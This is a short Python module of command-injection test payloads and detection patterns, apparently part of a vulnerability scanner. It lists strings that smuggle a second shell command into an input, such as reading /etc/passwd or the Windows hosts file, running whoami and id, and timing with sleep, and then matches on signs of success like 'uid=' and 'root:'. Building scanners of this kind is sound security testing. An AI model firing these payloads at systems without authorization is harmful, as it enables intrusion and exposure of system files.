"""Payloads para detección de Command Injection / OS Command Injection."""

QUICK_PAYLOADS = [
    "; whoami",
    "| whoami",
    "& whoami",
    "&& whoami",
    "|| whoami",
    "; id",
    "| id",
    "`whoami`",
    "$(whoami)",
    "; cat /etc/passwd",
]

FULL_PAYLOADS = [
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "; uname -a",
    "| uname -a",
    "; ls -la",
    "| ls -la",
    "&& id",
    "|| id",
    "`id`",
    "$(id)",
    "; echo VULN_TEST_12345",
    "| echo VULN_TEST_12345",
    "&& echo VULN_TEST_12345",
    "|| echo VULN_TEST_12345",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
    "; sleep 3",
    "| sleep 3",
    "&& sleep 3",
    "%0awhoami",
    "%0aid",
    ";\nwhoami",
    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; dir",
]

# Patrones que indican command injection exitosa
DETECTION_PATTERNS = [
    "uid=",
    "gid=",
    "root:",
    "/bin/bash",
    "/bin/sh",
    "www-data",
    "apache",
    "nginx",
    "VULN_TEST_12345",
    "linux",
    "darwin",
    "total ",       # salida de ls -la
    "drwx",         # permisos de directorio
    "-rw-",         # permisos de archivo
    "127.0.0.1",    # ping
    "bytes from",   # ping
    "ttl=",         # ping
    "password",     # /etc/passwd
    "nobody",       # /etc/passwd
]
